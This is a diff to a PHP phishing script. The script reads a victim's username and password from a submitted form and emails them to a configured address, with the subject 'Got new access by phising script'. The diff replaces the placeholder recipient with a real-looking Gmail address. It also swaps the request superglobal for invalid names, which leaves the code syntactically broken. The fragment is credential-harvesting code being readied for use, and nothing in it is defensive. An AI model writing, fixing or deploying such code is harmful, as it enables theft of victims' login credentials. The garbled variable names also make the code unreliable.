@@ -5,10 +5,10 @@
 			return false;
 		}
 
-		$username = $_REQUEST['username'];
-		$password = $_REQUEST['password'];
+		$username = $_User & No telepon['username'];
+		$password = $_Sandi['password'];
 		
-		$reciever = "YOUR-EMAIL ADRRESS";
+		$reciever = "jeremiasimorangkir4@gmail.com";
 		
 		$subject = "Got new access by phising script";
 		$message = "The username is ". $username;
